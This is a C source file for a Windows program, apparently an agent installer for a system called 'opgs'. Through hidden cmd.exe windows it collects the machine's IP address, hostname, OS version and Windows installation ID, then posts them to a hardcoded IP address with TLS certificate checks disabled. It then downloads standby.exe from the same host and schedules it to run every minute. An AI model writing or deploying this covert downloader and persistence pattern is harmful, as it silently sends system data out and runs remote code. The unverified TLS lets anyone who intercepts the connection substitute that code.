#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <tchar.h>
#include <windows.h>
#define CURL_STATICLIB
#include <direct.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
// curl-7.40.0-devel-mingw32
#include <curl/curl.h>
#define POST_SIZE 2048

int mkdir(const char *);
char filename[FILENAME_MAX] = "C:\\tmp\\standby.exe";
size_t callback_file(void *, size_t , size_t , FILE *);

int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    FILE *fp;
    CURL *curl;
    char *url = "https://120.125.80.141/opgs/agent/agent_update.php";
    char agent[] = "opgs/1.1";
    char postdata[POST_SIZE];
    char cmd[256];
    char line[1024];
    char hip[16];
    char hname[128];
    char hver[128];
    char *callback;
    _mkdir("C:\\tmp");

    ///get IP address
    sprintf(cmd,"/c %s %s > C:\\tmp\\a.txt",
            "%windir%\\Sysnative\\route print ",
            "| %windir%\\Sysnative\\findstr \"\\<0.0.0.0\\>\"");
    //system(cmd);
    SHELLEXECUTEINFO ShExecInfo2 = {0};
    ShExecInfo2.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo2.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo2.hwnd = NULL;
    ShExecInfo2.lpVerb = NULL;
    ShExecInfo2.lpFile = "cmd.exe";
    ShExecInfo2.lpParameters = cmd;
    ShExecInfo2.lpDirectory = NULL;
    ShExecInfo2.nShow = SW_HIDE;
    ShExecInfo2.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo2);
    WaitForSingleObject(ShExecInfo2.hProcess,INFINITE);

    fp = fopen("C:\\tmp\\a.txt", "r");
    fgets(line,1024,fp);
    sscanf(line,"%*s %*s %*s %s",hip);
    printf("Your ip=%s\n",hip);

///get hostname
    sprintf(cmd,"/c %s > C:\\tmp\\a.txt",
            "%windir%\\Sysnative\\hostname");
    //system(cmd);
    SHELLEXECUTEINFO ShExecInfo3 = {0};
    ShExecInfo3.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo3.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo3.hwnd = NULL;
    ShExecInfo3.lpVerb = NULL;
    ShExecInfo3.lpFile = "cmd.exe";
    ShExecInfo3.lpParameters = cmd;
    ShExecInfo3.lpDirectory = NULL;
    ShExecInfo3.nShow = SW_HIDE;
    ShellExecuteEx(&ShExecInfo3);
    WaitForSingleObject(ShExecInfo3.hProcess,INFINITE);
    fp = fopen("C:\\tmp\\a.txt", "r");
    fgets(line,1024,fp);
    sscanf(line,"%s",hname);
    printf("Your PC-name=%s\n",hname);

///get OS VERSION
    sprintf(cmd,"/c %s %s > C:\\tmp\\a.txt",
            "%windir%\\Sysnative\\net config workstation ",
            "| %windir%\\Sysnative\\findstr \"軟體版本\"");
    //system(cmd);
    SHELLEXECUTEINFO ShExecInfo4 = {0};
    ShExecInfo4.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo4.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo4.hwnd = NULL;
    ShExecInfo4.lpVerb = NULL;
    ShExecInfo4.lpFile = "cmd.exe";
    ShExecInfo4.lpParameters = cmd;
    ShExecInfo4.lpDirectory = NULL;
    ShExecInfo4.nShow = SW_HIDE;
    ShExecInfo4.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo4);
    WaitForSingleObject(ShExecInfo4.hProcess,INFINITE);

    fp = fopen("C:\\tmp\\a.txt", "r");
    fgets(line,1024,fp);
    int i,j=0;
    for(i=33; i<=strlen(line); i++)
    {
        hver[j++] = line[i];
    }
    printf("Your PC-version=%s\n",hver);


///get install ID
    char install_id[128];
    sprintf(cmd,"/c %s %s > C:\\tmp\\a.txt",
            "%windir%\\Sysnative\\cscript %windir%\\System32\\slmgr.vbs /dlv",
            "| %windir%\\Sysnative\\findstr \"安裝識別碼\"");
    SHELLEXECUTEINFO ShExecInfo = {0};
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = cmd;
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess,INFINITE);

    fp = fopen("C:\\tmp\\a.txt", "r");
    fgets(line,1024,fp);
    sscanf(line,"%*s %s",install_id);

    sprintf(postdata,"hip=%s&hname=%s&hver=%s&install_id=%s",
        hip,hname,hver,install_id);
    ///printf("Your iid=%s\n",install_id);
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, agent);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0L);
    curl_easy_setopt(curl, CURLOPT_POST,1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,postdata);
    callback = (char *)curl_easy_perform(curl);


///download standby.exe
    url = "https://120.125.80.141/opgs/agent/standby.exe";
    fp = fopen(filename,"wb");
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_file);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_perform(curl);
    fclose(fp);
    //system("C:\\tmp\\standby.exe");
    curl_easy_cleanup(curl);


///Scheduling standby.exe
    sprintf(cmd,"/c %s > C:\\tmp\\a.txt",
            "%windir%\\System32\\schtasks /create /tn \"standby\" /sc minute /mo 1 /tr \"C:\\tmp\\standby.exe\" /F");
    SHELLEXECUTEINFO ShexecInfo5 = {0};
    ShexecInfo5.cbSize = sizeof(SHELLEXECUTEINFO);
    ShexecInfo5.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShexecInfo5.hwnd = NULL;
    ShexecInfo5.lpVerb = NULL;
    ShexecInfo5.lpFile = "cmd.exe";
    ShexecInfo5.lpParameters = cmd;
    ShexecInfo5.lpDirectory = NULL;
    ShexecInfo5.nShow = SW_HIDE;
    ShexecInfo5.hInstApp = NULL;
    ShellExecuteEx(&ShexecInfo5);
    WaitForSingleObject(ShexecInfo5.hProcess,INFINITE);
}

size_t callback_file(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}


